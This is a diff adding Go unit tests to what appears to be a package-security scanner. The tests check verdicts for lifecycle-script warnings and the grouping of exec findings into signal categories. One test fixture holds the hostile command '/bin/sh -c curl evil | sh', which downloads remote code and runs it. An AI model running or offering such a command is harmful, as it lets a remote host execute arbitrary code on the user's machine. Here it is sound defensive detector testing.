@@ -64,6 +64,17 @@ func TestEvaluateSuppressExpectedBehavior(t *testing.T) {
 	}
 }
 
+func TestEvaluateExpectedBehaviorStaysSuspiciousWithoutSuppression(t *testing.T) {
+	// Non-Node profiles do not opt into suppression, so lifecycle warnings
+	// must still count toward the verdict.
+	verdict := Evaluate([]Finding{
+		{Severity: SeverityWarning, ReasonCode: "NPM_LIFECYCLE_SCRIPTS"},
+	}, defaultOpts)
+	if verdict != VerdictSuspicious {
+		t.Fatalf("expected suspicious verdict without suppression, got %s", verdict)
+	}
+}
+
 func TestEvaluateEnvTheftIsMalicious(t *testing.T) {
 	verdict := Evaluate([]Finding{
 		{Severity: SeverityCritical, ReasonCode: "ENV_THEFT"},
@@ -226,5 +237,36 @@ func TestBuildSignalsReportsRawObservations(t *testing.T) {
 	}
 	if strings.Contains(strings.ToLower(output), "confidence") || strings.Contains(output, `"findings"`) {
 		t.Fatalf("legacy scoring fields leaked into CI schema: %s", output)
+	}
+}
+
+func TestBuildSignalsSeparatesExecutionFromLifecycleWarnings(t *testing.T) {
+	signals := BuildSignals([]Finding{
+		{Severity: SeverityCritical, Type: "exec", ReasonCode: "SUSPICIOUS_EXEC", Path: "/bin/sh -c curl evil | sh"},
+		{Severity: SeverityCritical, Type: "exec", ReasonCode: "FILELESS_EXEC", Path: "payload"},
+		{Severity: SeverityWarning, Type: "command", ReasonCode: "NPM_LIFECYCLE_SCRIPTS", Path: "npm install lodash"},
+	})
+
+	byCategory := map[SignalCategory]Signal{}
+	for _, s := range signals {
+		byCategory[s.Category] = s
+	}
+
+	execution, ok := byCategory[SignalExecution]
+	if !ok || len(execution.Observations) != 2 {
+		t.Fatalf("expected two execution observations, got %#v", signals)
+	}
+	for _, o := range execution.Observations {
+		if o.Kind != "process-spawn" {
+			t.Fatalf("expected process-spawn kind for exec finding, got %#v", o)
+		}
+	}
+
+	registry, ok := byCategory[SignalSuspiciousRegistry]
+	if !ok || len(registry.Observations) != 1 || registry.Observations[0].ReasonCode != "NPM_LIFECYCLE_SCRIPTS" {
+		t.Fatalf("expected lifecycle warning under suspicious-registry, got %#v", signals)
+	}
+	if _, ok := byCategory[SignalPersistence]; ok {
+		t.Fatalf("process execution must not be reported as persistence: %#v", signals)
 	}
 }
